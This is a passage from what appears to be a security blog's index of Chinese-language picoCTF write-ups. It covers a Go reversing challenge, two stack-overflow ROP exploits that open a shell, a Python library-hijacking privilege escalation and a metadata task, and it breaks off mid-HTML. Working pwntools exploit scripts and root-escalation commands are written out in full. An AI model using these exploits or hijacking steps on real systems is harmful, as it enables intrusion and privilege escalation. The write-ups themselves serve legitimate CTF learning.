// [esp+28h] [ebp-30h] BYREF string *v4; // [esp+34h] [ebp-24h] _DWORD v5[2]; // [esp+38h] [ebp-20h] BYREF _DWORD v6[2]; // [esp+40h] [ebp-18h] BYREF _slice_interface_ v7; // [esp+48h] [ebp-10h] BYREF string *v8; // [esp+54h] [ebp-4h] flag = runtime_newobject(\u0026amp;RTYPE_string_0); typ[0].array = \u0026#34;Enter Password: \u0026#34;; typ[0].len = 16; memset(\u0026amp;typ[0].cap, 0, sizeof(_slice_interface_)); fmt_Printf(*\u0026amp;typ[0].array, *\u0026amp;typ[0].cap); v6[0] = \u0026amp;RTYPE__ptr_string; v6[1] = flag; typ[0].array = \u0026#34;%s\\n\u0026#34;; typ[0].len = 3; typ[0].cap = v6; *\u0026amp;typ[1].array = 0x100000001LL; fmt_Scanf(*\u0026amp;typ[0].array, *\u0026amp;typ[0].cap); if ( main_checkPassword(*flag) ) { v5[0] = \u0026amp;RTYPE_string_0; v5[1] = \u0026amp;main_statictmp_0; typ[0].array = v5; *\u0026amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); v3.cap = \u0026amp;RTYPE_string_0; v4 = \u0026amp;main_statictmp_1; typ[0].array = \u0026amp;v3.cap; *\u0026amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); v3.array = \u0026amp;RTYPE_string_0; v3.len = \u0026amp;main_statictmp_2; typ[0].array = \u0026amp;v3; *\u0026amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); second_flag = runtime_newobject(\u0026amp;RTYPE_string_0); v7.cap = \u0026amp;RTYPE__ptr_string; v8 = second_flag; typ[0].array = \u0026#34;%s\\n\u0026#34;; typ[0].len = 3; typ[0].cap = \u0026amp;v7.cap; *\u0026amp;typ[1].array = 0x100000001LL; fmt_Scanf(*\u0026amp;typ[0].array, *\u0026amp;typ[0].cap); main_ambush(*second_flag); runtime_deferproc(0, \u0026amp;stru_81046A0); } else { v7.array = \u0026amp;RTYPE_string_0; v7.len = \u0026amp;main_statictmp_3; typ[0].array = \u0026amp;v7; *\u0026amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); } runtime_deferreturn(typ[0].array); } :::\n:::spoiler IDA First Stage Checker\n// main.checkPassword bool __golang main_checkPassword(string flag) { __int32 idx; // eax int check_counter; // ebx uint8 key[32]; // [esp+4h] [ebp-40h] BYREF char enc_flag[32]; // [esp+24h] [ebp-20h] if ( flag.len \u0026lt; 32 ) os_Exit(0); (loc_8090B18)(); qmemcpy(key, \u0026#34;861836f13e3d627dfa375bdb8389214e\u0026#34;, sizeof(key)); (loc_8090FE0)(); idx = 0; check_counter = 0; while ( idx \u0026lt; 32 ) { if ( idx \u0026gt;= flag.len || idx \u0026gt;= 0x20 ) runtime_panicindex(); if ( (key[idx] ^ flag.str[idx]) == enc_flag[idx] ) ++check_counter; ++idx; } return check_counter == 32; } :::\n:::spoiler IDA Second Stage Checker\n// main.ambush void __golang main_ambush(string second_flag) { int j; // eax _slice_uint8 v2; // [esp+0h] [ebp-94h] _slice_uint8 s; // [esp+4h] [ebp-90h] _slice_uint8 dataa; // [esp+Ch] [ebp-88h] string data; // [esp+Ch] [ebp-88h] string data_4; // [esp+10h] [ebp-84h] uint8 v7; // [esp+1Fh] [ebp-75h] unsigned __int32 i; // [esp+20h] [ebp-74h] uint8 hashed[16]; // [esp+24h] [ebp-70h] BYREF uint8 key[32]; // [esp+34h] [ebp-60h] BYREF uint8 buf[32]; // [esp+54h] [ebp-40h] BYREF uint8 v12[32]; // [esp+74h] [ebp-20h] BYREF dataa = runtime_stringtoslicebyte(buf, second_flag); crypto_md5_Sum(dataa); (loc_8091008)(); (loc_8090B18)(); qmemcpy(key, \u0026#34;861836f13e3d627dfa375bdb8389214e\u0026#34;, sizeof(key)); for ( j = 0; j \u0026lt; 16; j = i + 1 ) { i = j; v2.array = hashed; *\u0026amp;v2.len = 0x1000000010LL; data = encoding_hex_EncodeToString(v2); if ( i \u0026gt;= data.len || (v7 = data.str[i], s.array = key, *\u0026amp;s.len = 0x2000000020LL, data_4 = runtime_slicebytetostring(v12, s), i \u0026gt;= data_4.len) ) { runtime_panicindex(); } if ( v7 != data_4.str[i] ) os_Exit(0); } } :::\nRecon # 終於有一點像樣的題目出現了，這一題有兩個關卡需要克服\n$ file enter_password enter_password: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, Go BuildID=3-hVI6nMz0HbfIUMSEzq/TkiA8oRk8FHsCuRXIle2/C1my_KvOIt2KUk44LyQs/-XrwOx7UDhcGGdtF5xpG, with debug_info, not stripped 用IDA和gdb跟一下整體的流程\n首先他先把我們輸入的flag，丟到main_checkPassword function檢查，而跟了一下gdb發現他是先跟861836f13e3d627dfa375bdb8389214e的每一個數值進行xor然後跟enc_flag的字元做比較，而enc_flag是run time的時候需要從memory撈的資料，這就需要慢慢跟然後慢慢看，大概就像下面撈的那樣，反著作就可以得到第一階段的flag 過了第一階段後他還會叫你要再輸入一次另外一個flag，然後會丟到main_ambush function做檢查，他會先把我們輸入的second flag進行md5的hash，然後和861836f13e3d627dfa375bdb8389214e進行比對，所以我們要做的事情是推測甚麼樣的字串，他的md5 hash是861836f13e3d627dfa375bdb8389214e，這個可以用online tool做到這件事情 Exploit # Script For 1st Stage\nenc_flag = [74, 83, 71, 93, 65, 69, 3, 84, 93, 2, 90, 10, 83, 87, 69, 13, 5, 0, 93, 85, 84, 16, 1, 14, 65, 85, 87, 75, 69, 80, 70, 1] key = [0x38, 0x36, 0x31, 0x38, 0x33, 0x36, 0x66, 0x31, 0x33, 0x65, 0x33, 0x64, 0x36, 0x32, 0x37, 0x64, 0x66, 0x61, 0x33, 0x37, 0x35, 0x62, 0x64, 0x62, 0x38, 0x33, 0x38, 0x39, 0x32, 0x31, 0x34, 0x65] FLAG = [] for a, b in zip(enc_flag, key): FLAG.append(bytes.fromhex(hex(a ^ b)[2:]).decode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;\u0026#34;.join(FLAG)) Use online tool to unhash Conclusion\n$ nc mercury.picoctf.net 4052 Enter Password: reverseengineericanbarelyforward ========================================= This challenge is interrupted by psociety What is the unhashed key? goldfish Flag is: picoCTF{p1kap1ka_p1c09a4dd7f3} "},{"id":266,"href":"/security/practice/picoctf/pwn/picoctf---guessing-game-1/","title":"PicoCTF - Guessing Game 1","section":"Securities","content":" PicoCTF - Guessing Game 1 # Background # ROP Chain Linux System Call Table for x86 64\nSource code # :::spoiler\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #define BUFSIZE 100 long increment(long in) { return in + 1; } long get_random() { return rand() % BUFSIZE; } int do_stuff() { long ans = get_random(); ans = increment(ans); int res = 0; printf(\u0026#34;What number would you like to guess?\\n\u0026#34;); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf(\u0026#34;That\u0026#39;s not a valid number!\\n\u0026#34;); } else { if (g == ans) { printf(\u0026#34;Congrats! You win! Your prize is this print statement!\\n\\n\u0026#34;); res = 1; } else { printf(\u0026#34;Nope!\\n\\n\u0026#34;); } } return res; } void win() { char winner[BUFSIZE]; printf(\u0026#34;New winner!\\nName? \u0026#34;); fgets(winner, 360, stdin); printf(\u0026#34;Congrats %s\\n\\n\u0026#34;, winner); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf(\u0026#34;Welcome to my guessing game!\\n\\n\u0026#34;); while (1) { res = do_stuff(); if (res) { win(); } } return 0; } :::\nRecon # Recon $ file vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped $ checksec vuln [*] \u0026#39;/mnt/d/NTU/CTF/PicoCTF/PWN/Guessing Game 1/vuln\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 可以看到這隻程式沒有用動態連結的方式引入library，代表他都把一些libc會用到的東西編譯進去了 這支程式沒有明顯讀flag的地方，所以可以直覺想到要開shell，而main function的do_stuff subfunction主要應該是類似proof of work的部分(因為亂數的範圍也只要0-99)，當猜對random的數值後就近到win function然後可以填一些東西，達到bof的效果 所以也很直覺的想到one_gadget或是ROP chain的東西，這部分就比較傷腦筋，因為蓋的過程會有一點點繞，講白了這題和1幾乎一模一樣，但因為太久沒看所以忘記了 既然有bof，那我們就可以隨便的蓋rop chain，包括syscall read function，這也說明了如何寫/bin/sh\\x00的問題 ==執行的順序:== Guess random(PoW)$\\to$ syscall __libc_read function$\\to$ Input /bin/sh\\x00$\\to$ Return to main function$\\to$ Guess random(PoW)$\\to$ Syscall execve to get shell Note: 要如何知道.bss段在哪裡可以用readelf -S ./vuln查看\nExploit # from pwn import * import random # r = process(\u0026#34;./vuln\u0026#34;) r = remote(\u0026#34;jupiter.challenges.picoctf.org\u0026#34;, 39940) context.arch = \u0026#34;amd64\u0026#34; \u0026#39;\u0026#39;\u0026#39;############# Read /bin/sh by libc read function #############\u0026#39;\u0026#39;\u0026#39; r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) while(1): r.sendline(str(randint(1, 99)).encode()) tmp = r.recvline().strip().decode() print(tmp) if tmp != \u0026#34;Nope!\u0026#34;: success(\u0026#34;You got it!!!\u0026#34;) break r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) print(r.recvuntil(b\u0026#39;Name? \u0026#39;)) pop_rax_ret = 0x4163f4 pop_rdi_ret = 0x400696 pop_rdx_ret = 0x44a6b5 pop_rsi_ret = 0x410ca3 main_fun_addr = 0x400c8c libc_read_addr = 0x44a6a0 write_2_bss = 0x6b7000 syscall = 0x40137c ROP_payload = flat( pop_rdi_ret, 0, pop_rsi_ret, write_2_bss, pop_rdx_ret, 9, libc_read_addr, main_fun_addr ) # raw_input() r.sendline(b\u0026#39;a\u0026#39; * 0x78 + ROP_payload) r.sendline(b\u0026#39;/bin/sh\\x00\u0026#39;) \u0026#39;\u0026#39;\u0026#39;############# Execute shell #############\u0026#39;\u0026#39;\u0026#39; r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) while(1): r.sendline(str(randint(1, 99)).encode()) tmp = r.recvline().strip().decode() print(tmp) if tmp != \u0026#34;Nope!\u0026#34;: success(\u0026#34;You got it!!!\u0026#34;) break r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) print(r.recvuntil(b\u0026#39;Name? \u0026#39;)) ROP_payload = flat( pop_rax_ret, 0x3b, pop_rdi_ret, write_2_bss, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall ) # raw_input() r.sendline(b\u0026#39;a\u0026#39; * 0x78 + ROP_payload) r.interactive() Reference # PicoCTF - Guessing Game 1 [Pwn]\nSimple PWN - 0x12(Lab - rop++)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":267,"href":"/security/practice/picoctf/pwn/picoctf---guessing-game-2/","title":"PicoCTF - Guessing Game 2","section":"Securities","content":" PicoCTF - Guessing Game 2 # Background # fmt / leak libc / ret2libc / leak canary\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #define BUFSIZE 512 long get_random() { return rand; } int get_version() { return 2; } // void print(long n) // { // // If number is smaller than 0, put a - sign // // and change number to positive // if (n \u0026lt; 0) { // putchar(\u0026#39;-\u0026#39;); // n = -n; // } // // Remove the last digit and recur // if (n/10) // print(n/10); // // Print the last digit // putchar(n%10 + \u0026#39;0\u0026#39;); // } int do_stuff() { long ans = (get_random() % 4096) + 1; // print(ans); int res = 0; printf(\u0026#34;What number would you like to guess?\\n\u0026#34;); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf(\u0026#34;That\u0026#39;s not a valid number!\\n\u0026#34;); } else { if (g == ans) { printf(\u0026#34;Congrats! You win! Your prize is this print statement!\\n\\n\u0026#34;); res = 1; } else { printf(\u0026#34;Nope!\\n\\n\u0026#34;); } } return res; } void win() { char winner[BUFSIZE]; printf(\u0026#34;New winner!\\nName? \u0026#34;); gets(winner); printf(\u0026#34;Congrats: \u0026#34;); printf(winner); printf(\u0026#34;\\n\\n\u0026#34;); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf(\u0026#34;Welcome to my guessing game!\\n\u0026#34;); printf(\u0026#34;Version: %x\\n\\n\u0026#34;, get_version()); while (1) { res = do_stuff(); if (res) { win(); } } return 0; } :::\nRecon # 寫這一題的時候切記不要隨便因為Error /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.34' not found的錯誤訊息而更新glibc，也就是下sudo apt install libc6這個command，經過實測是因為他給的elf執行檔有點問題，只要重新make就好，不然在用gdb trace code的時候，就會GG\n$ sudo apt install -y make $ sudo apt-get install gcc -y $ sudo apt-get install libc6-i386 -y $ sudo apt-get install gcc-multilib -y $ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=69d83a7733e45de8e38431f09ee2cdb1b11b719e, for GNU/Linux 3.2.0, not stripped $ checksec vuln [*] \u0026#39;/mnt/d/NTU/CTF/PicoCTF/PWN/Guessing Game 2/vuln\u0026#39; Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) Brute Force Server Secret Number 看了source code可以發現他和上一題幾乎一樣，上一題是要猜1-100的數字，而他會有固定的模式出現，所以可以直接用gdb跟他到底是哪些數字，但這一題的範圍明顯大很多(1-4096)，此時就要講到和上一題不一樣的地方，也就是第十行的==get_random== function中return的value是rand，他return的東西應該是一個固定的object而非經過運算的function(也就是==rand()==)，所以只要他沒有把靶機重開，運算的結果都會是一樣的，此時我們可以寫一個brute force script去try他用哪一個數字，以我的例子來說server的數字是-3727，而如果想知道local side的數字是多少，可以直接把原本的source code註解的部分拔掉，再make就會自己告訴你了 Leak libc version 接著就是開始try rop，可以看到61行有個明顯的bof，但我們應該先想辦法leak libc version，因為如果直接用vuln執行檔找ROP會少的可憐，所以要用libc，但是libc最後找的東西不見得會和他的版本一樣，這也是為甚麼不能更新glibc的原因，在stack中的相對位置不會一樣，會找的很痛苦而且做白工，leak libc的方法這邊是用fmt，雖然應該只有這個方法(在63行)，在print之前可以看一下stack的狀況，很明顯$esp+0x24c的地方出現__libc_start_main，利用online database searching tool可以知道server用甚麼版本 0xffffc98c│+0x022c: 0x080495bb → \u0026lt;main+145\u0026gt; jmp 0x80495a8 \u0026lt;main+126\u0026gt; 0xffffc990│+0x0230: 0x00000001 0xffffc994│+0x0234: 0xffffca54 → 0xffffcc27 0xffffc998│+0x0238: 0x000003e8 0xffffc99c│+0x023c: 0x00000001 0xffffc9a0│+0x0240: 0xffffc9c0 → 0x00000001 0xffffc9a4│+0x0244: 0x00000000 0xffffc9a8│+0x0248: 0x00000000 0xffffc9ac│+0x024c: 0xf7deded5 → \u0026lt;__libc_start_main+245\u0026gt; add esp, 0x10 0xffffc9b0│+0x0250: 0xf7fbb000 → 0x001e7d6c 0xffffc9b4│+0x0254: 0xf7fbb000 → 0x001e7d6c 而libc base address就是0xf7d34fa1-0x018fa1=0xf7d1c000 :::info Note: 在x86版本中，fmt的顯示順序是從$esp的地方開始，所以__libc_start_main就是在$esp往後數==第147個位數== ::: Change Execute Environment 此時我們知道libc的版本是2.27，那就代表應該是18.04的版本，如果不想要費事裝VM或wsl就可以直接用@ccccc提供的腳本，讓這支程式跑在和server一樣的環境，==所以要把對應環境的loader和libc載下來==，用法如下: $ python {script path} {new env loader path} {original elf file} # e.g. python ./LD_PRELOAD.py ./ld-2.27.so ./vuln 他會產生一個新的執行檔，名字是V，在pwntools寫的腳本也要改，用法如下 r = process(\u0026#39;./V\u0026#39;,env={\u0026#34;LD_PRELOAD\u0026#34; : \u0026#34;./libc-2.27.so\u0026#34;}) 此時我們跑的結果就換會和server端一樣 from pwn import * if args.REMOTE: r = remote(\u0026#34;jupiter.challenges.picoctf.org\u0026#34;, 18263) ans = -3727 elif args.LOCAL: r = process(\u0026#34;./V\u0026#34;, env={\u0026#34;LD_PRELOAD\u0026#34; : \u0026#34;./libc-2.27.so\u0026#34;}) # r = process(\u0026#39;./vuln\u0026#39;) # ans = -3615 ans = -3727 \u0026#39;\u0026#39;\u0026#39;############# Find Libc address by stack info #############\u0026#39;\u0026#39;\u0026#39; r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) r.sendline(str(ans).encode()) r.recvuntil(b\u0026#39;Name? \u0026#39;) r.sendline(b\u0026#34;%147$p\u0026#34;) r.recvuntil(b\u0026#34;Congrats: 0x\u0026#34;) __libc_start_main = int(r.recvuntil(b\u0026#34;\\n\u0026#34;).strip().decode(), 16) libc_addr = __libc_start_main - 0x018fa1 libc_system_addr = libc_addr + 0x03cf10 success(f\u0026#34;libc base address = {hex(libc_addr)}\u0026#34;) success(f\u0026#34;libc system address = {hex(libc_system_addr)}\u0026#34;) raw_input() $ python exp.py LOCAL [+] Starting local process \u0026#39;./vuln\u0026#39;: pid 9451 [+] libc base address = 0xf7dce000 [+] libc system address = 0xf7e0af10 $ python exp.py REMOTE [+] Opening connection to jupiter.challenges.picoctf.org on port 18263: Done [+] libc base address = 0xf7d99000 [+] libc system address = 0xf7dd5f10 找canary 這一題因為有開canary又要觸發rop所以勢必會蓋到，可以先把相對位置記起來，也就是$esp+0x021c 0xffffc978│+0x0218: 0xf7e22d39 → \u0026lt;printf+9\u0026gt; add eax, 0x1982c7 0xffffc97c│+0x021c: 0x0c458f00 0xffffc980│+0x0220: 0x0804a0c4 → \u0026#34;Version: %x\\n\\n\u0026#34; 0xffffc984│+0x0224: 0x0804bfb8 → 0x0804bec0 0xffffc988│+0x0228: 0xffffc9a8 → 0x00000000 ← $ebp $ python exp.py LOCAL [+] Starting local process \u0026#39;./V\u0026#39;: pid 11379 [+] libc base address = 0xf7d2f000 [+] libc system address = 0xf7d6bf10 [+] Canary Value = 0xd824d100 寫/bin/sh\\x00並開shell 要開shell的話必須要找個地方寫/bin/sh\\x00，但是我有想過要用system read的方式，但是找不到int 0x80 ; ret的gadget所以就直接寫在stack上最快也最方便，只是要計算執行到開shell之前的esp或ebp，所以我們可以直接沿用fmt的技巧先把ebp的address紀錄起來等到把/bin/sh寫上去之後再看offset是多少，以我的例子來說就是差了0x8的距離，可以直接用gdb跟一下就知道了 r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) r.sendline(str(ans).encode()) r.recvuntil(b\u0026#39;Name? \u0026#39;) r.sendline(b\u0026#34;%138$p\u0026#34;) r.recvuntil(b\u0026#34;Congrats: \u0026#34;) ebp_addr = int(r.recvuntil(b\u0026#34;\\n\u0026#34;).strip().decode(), 16) success(f\u0026#34;ebp address = {hex(ebp_addr)}\u0026#34;) # raw_input() bin_sh_1 = 0x6e69622f bin_sh_2 = 0x68732f pop_eax_ret = 0x00024d37 + libc_addr pop_ebx_ret = 0x00018d05 + libc_addr pop_ecx_ret = 0x00193aa4 + libc_addr pop_edx_ret = 0x00001aae + libc_addr int_0x80 = 0x00002d3f + libc_addr ROP_payload = flat( pop_eax_ret, 0xb, pop_ebx_ret, (ebp_addr+0x8), pop_ecx_ret, 0, pop_edx_ret, 0, int_0x80, bin_sh_1, bin_sh_2 ) r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) r.sendline(str(ans).encode()) r.recvuntil(b\u0026#39;Name? \u0026#39;) r.sendline(b\u0026#39;a\u0026#39; * (0x200) + p32(canary_value) + b\u0026#39;a\u0026#39; * 0xc + ROP_payload) Exploit - ROP gadget / leak libc / leak Canary # 這一題算是綜合蠻多stack vulnerability的技巧，所以過程蠻複雜的，但只要環境對了就很順利\nfrom pwn import * import random if args.REMOTE: r = remote(\u0026#34;jupiter.challenges.picoctf.org\u0026#34;, 18263) ans = -3727 elif args.LOCAL: r = process(\u0026#34;./V\u0026#34;, env={\u0026#34;LD_PRELOAD\u0026#34; : \u0026#34;./libc-2.27.so\u0026#34;}) # r = process(\u0026#39;./vuln\u0026#39;) # ans = -3615 ans = -3727 \u0026#39;\u0026#39;\u0026#39;############# Find Libc address by stack info #############\u0026#39;\u0026#39;\u0026#39; r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) r.sendline(str(ans).encode()) r.recvuntil(b\u0026#39;Name? \u0026#39;) r.sendline(b\u0026#34;%147$p\u0026#34;) r.recvuntil(b\u0026#34;Congrats: 0x\u0026#34;) __libc_start_main = int(r.recvuntil(b\u0026#34;\\n\u0026#34;).strip().decode(), 16) libc_addr = __libc_start_main - 0x018fa1 libc_system_addr = libc_addr + 0x03cf10 success(f\u0026#34;libc base address = {hex(libc_addr)}\u0026#34;) success(f\u0026#34;libc system address = {hex(libc_system_addr)}\u0026#34;) # raw_input() \u0026#39;\u0026#39;\u0026#39;############# Find Canary Value #############\u0026#39;\u0026#39;\u0026#39; r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) r.sendline(str(ans).encode()) r.recvuntil(b\u0026#39;Name? \u0026#39;) r.sendline(b\u0026#34;%135$p\u0026#34;) r.recvuntil(b\u0026#34;Congrats: 0x\u0026#34;) canary_value = int(r.recvuntil(b\u0026#34;\\n\u0026#34;).strip().decode(), 16) success(f\u0026#34;Canary Value = {hex(canary_value)}\u0026#34;) # raw_input() \u0026#39;\u0026#39;\u0026#39;############# Get Shell #############\u0026#39;\u0026#39;\u0026#39; r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) r.sendline(str(ans).encode()) r.recvuntil(b\u0026#39;Name? \u0026#39;) r.sendline(b\u0026#34;%138$p\u0026#34;) r.recvuntil(b\u0026#34;Congrats: \u0026#34;) ebp_addr = int(r.recvuntil(b\u0026#34;\\n\u0026#34;).strip().decode(), 16) success(f\u0026#34;ebp address = {hex(ebp_addr)}\u0026#34;) # raw_input() bin_sh_1 = 0x6e69622f bin_sh_2 = 0x68732f pop_eax_ret = 0x00024d37 + libc_addr pop_ebx_ret = 0x00018d05 + libc_addr pop_ecx_ret = 0x00193aa4 + libc_addr pop_edx_ret = 0x00001aae + libc_addr int_0x80 = 0x00002d3f + libc_addr ROP_payload = flat( pop_eax_ret, 0xb, pop_ebx_ret, (ebp_addr+0x8), pop_ecx_ret, 0, pop_edx_ret, 0, int_0x80, bin_sh_1, bin_sh_2 ) r.recvuntil(b\u0026#39;What number would you like to guess?\\n\u0026#39;) r.sendline(str(ans).encode()) r.recvuntil(b\u0026#39;Name? \u0026#39;) r.sendline(b\u0026#39;a\u0026#39; * (0x200) + p32(canary_value) + b\u0026#39;a\u0026#39; * 0xc + ROP_payload) # raw_input() r.interactive() Flag: picoCTF{p0p_r0p_4nd_dr0p_1t_73d8dcc827619318}\nReference # PicoCTF — Guessing Game 2 Walkthrough | ret2libc, stack cookies\n"},{"id":268,"href":"/security/practice/picoctf/pwn/picoctf---hijacking/","title":"PicoCTF - hijacking","section":"Securities","content":" PicoCTF - hijacking # Background # Privilege Escalation\nHint 1: Check for Hidden files Hint 2: No place like Home:)\nLinux sudo命令\n-l 顯示出自己（執行 sudo 的使用者）的權限\nRecon # 第一次遇到提權的問題，感覺很新鮮也很好玩，不過因為沒啥概念所以主要是參考1\n首先觀察一下各個file或folders，根目錄有個challenge folder，另外家目錄有一個.server.py檔案，裡面的內容不太重要，只需要知道他import哪些library 現在的問題是按照目前的權限，無法讀取challenge相關的資訊，所以我們要提升權限，主要的做法是利用base64.py這個mod全開的檔案進行讀寫，再利用python執行有import base64的.server.py檔案就可以執行shell 為神麼要用base64.py當作主要的突破口就是因為只有他的mod全開 $ ls -al /usr/lib/python3.8 ... -rwxrwxrwx 1 root root 20382 Nov 14 2022 base64.py ... -rw-r--r-- 1 root root 38995 Nov 14 2022 os.py ... -rw-r--r-- 1 root root 35243 Nov 14 2022 socket.py Exploit # $ ssh picoctf@saturn.picoctf.net -p 58219 $ find / -name \u0026#34;base64.py\u0026#34; ... /usr/lib/python3.8/base64.py ... $ vim /usr/lib/python3.8/base64.py # add these line and save the file import os os.system(\u0026#39;ls -al /challenge\u0026#39;) $ sudo -l Matching Defaults entries for picoctf on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User picoctf may run the following commands on challenge: (ALL) /usr/bin/vi (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py $ sudo /usr/bin/python3 /home/picoctf/.server.py total 4 d--------- 1 root root 6 Mar 16 02:08 . drwxr-xr-x 1 root root 51 Jul 31 15:23 .. -rw-r--r-- 1 root root 103 Mar 16 02:08 metadata.json sh: 1: ping: not found Traceback (most recent call last): File \u0026#34;/home/picoctf/.server.py\u0026#34;, line 7, in \u0026lt;module\u0026gt; host_info = socket.gethostbyaddr(ip) socket.gaierror: [Errno -5] No address associated with hostname $ vim /usr/lib/python3.8/base64.py # revise the file os.system(\u0026#39;cat /challegne/metadata.json\u0026#39;) $ sudo /usr/bin/python3 /home/picoctf/.server.py {\u0026#34;flag\u0026#34;: \u0026#34;picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;picoctf\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;HYGhWsmPyf\u0026#34;}sh: 1: ping: not found Traceback (most recent call last): File \u0026#34;/home/picoctf/.server.py\u0026#34;, line 7, in \u0026lt;module\u0026gt; host_info = socket.gethostbyaddr(ip) socket.gaierror: [Errno -5] No address associated with hostname Flag: picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}\nReference # picoCTF 2023 hijacking \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":269,"href":"/security/practice/picoctf/misc/picoctf---information/","title":"PicoCTF - information","section":"Securities","content":" PicoCTF - information # tags: PicoCTF CTF Misc # Challenge: https://play.picoctf.org/practice/challenge/186?category=4\u0026page=1\nBackground # ExifTool\nExploit # $ exiftool cat.jpg ExifTool Version Number : 11.88 File Name : cat.jpg Directory : . File Size : 858 kB File Modification Date/Time : 2023:02:16 02:15:29+08:00 File Access Date/Time : 2023:02:16 16:09:51+08:00 File Inode Change Date/Time : 2023:02:16 12:31:32+08:00 File Permissions : rwxrwxrwx File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.02 Resolution Unit : None X Resolution : 1 Y Resolution : 1 Current IPTC Digest : 7a78f3d9cfb1ce42ab5a3aa30573d617 Copyright Notice : PicoCTF Application Record Version : 4 XMP Toolkit : Image::ExifTool 10.80 License : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 Rights : PicoCTF Image Width : 2560 Image Height : 1598 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 2560x1598 Megapixels : 4.1 In License row, it\u0026rsquo;s obviously a base64 encoding string picoCTF{the_m3tadata_1s_modified}\nReference # picoCTF 2021: Forensics - information\n"},{"id":270,"href":"/security/practice/picoctf/web/picoctf---insp3ct0r/","title":"PicoCTF - Insp3ct0r","section":"Securities","content":" PicoCTF - Insp3ct0r # tags: PicoCTF CTF Web # Challenge: Insp3ct0r\nSource code # Exploit - Browser Inspector # HTML\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;My First Website :)\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css?family=Open+Sans|Roboto\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;mycss.css\u0026#34;\u0026gt; \u0026lt;script type=\u0026#34;application/javascript\u0026#34; src=\u0026#34;myjs.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;Inspect Me\u0026lt;/h1\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;button class=\u0026#34;tablink\u0026#34; onclick=\u0026#34;openTab(\u0026#39;tabintro\u0026#39;, this, \u0026#39;#222\u0026#39;)\u0026#34; id=\u0026#34;defaultOpen\u0026#34;\u0026gt;What\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;tablink\u0026#34; onclick=\u0026#34;openTab(\u0026#39;tababout\u0026#39;, this, \u0026#39;#222\u0026#39;)\u0026#34;\u0026gt;How\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;tabintro\u0026#34; class=\u0026#34;tabcontent\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;What\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;I made a website\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;tababout\u0026#34; 